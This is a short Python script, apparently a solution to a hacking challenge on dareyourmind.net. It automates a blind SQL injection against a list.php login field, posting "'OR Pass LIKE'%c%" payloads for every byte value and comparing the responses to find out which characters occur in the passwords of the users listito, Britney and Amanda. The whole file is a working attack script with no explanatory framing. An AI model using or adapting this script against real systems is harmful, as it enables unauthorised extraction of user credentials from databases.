import requests;
import string;
fail = requests.post('http://www.dareyourmind.net/real/sql2/list.php',{'user':"fail"});
allchar=''
for i in range(0,255):
    allchar+=chr(i)
    
for i in allchar:
    topost='\'OR Pass LIKE\'%'
    topost+=i
    topost+='%'
    tryto=requests.post('http://www.dareyourmind.net/real/sql2/list.php',{'user':topost});
    if(tryto.content!=fail.content):
        if 'listito' in tryto.content:
            print 'listito:'+i
        elif 'Britney' in tryto.content:
            print 'Britney:'+i
        elif 'Amanda' in tryto.content:
            print 'Amanda:'+i